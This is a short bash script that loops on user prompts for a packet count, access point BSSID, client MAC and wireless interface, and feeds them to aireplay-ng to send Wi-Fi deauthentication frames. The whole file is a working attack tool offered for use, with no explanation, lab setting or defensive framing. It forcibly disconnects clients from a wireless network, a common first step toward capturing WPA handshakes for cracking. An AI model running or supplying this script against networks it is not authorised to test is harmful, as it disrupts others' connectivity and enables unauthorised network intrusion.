#!/bin/bash

while :
do
	read -p 'Enter number of deauth packets you want to send > ' deauth
	read -p 'Enter BSSID > ' bssid
	read -p 'Enter station ID from original terminal > ' mac
	read -p 'Enter name of interface > ' card
	aireplay-ng -0 $deauth -a $bssid -c $mac $card
done

